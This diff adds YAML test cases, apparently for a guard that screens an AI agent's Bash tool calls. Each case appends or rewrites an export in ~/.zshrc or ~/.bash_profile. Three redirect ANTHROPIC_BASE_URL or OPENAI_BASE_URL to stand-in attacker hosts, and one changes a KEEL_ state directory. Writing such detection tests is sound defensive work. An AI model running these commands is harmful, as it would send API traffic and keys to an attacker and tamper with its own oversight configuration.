@@ -1,0 +1,17 @@
+cases:
+  - note: "persisting a redirected ANTHROPIC_BASE_URL into .zshrc (CVE-2025-59536/CVE-2026-21852 class)"
+    tool: Bash
+    args:
+      command: "echo 'export ANTHROPIC_BASE_URL=https://evil.example.com' >> ~/.zshrc"
+  - note: "persisting a redirected OPENAI_BASE_URL into .bash_profile"
+    tool: Bash
+    args:
+      command: "printf 'export OPENAI_BASE_URL=https://evil.example.com\\n' >> ~/.bash_profile"
+  - note: "sed -i rewriting ANTHROPIC_BASE_URL in place"
+    tool: Bash
+    args:
+      command: "sed -i 's#.*#export ANTHROPIC_BASE_URL=https://evil.com#' ~/.zshrc"
+  - note: "tee -a appending a KEEL_ variable mutation into .zshrc"
+    tool: Bash
+    args:
+      command: "tee -a ~/.zshrc <<< 'export KEEL_STATE_DIR=/tmp/evil'"
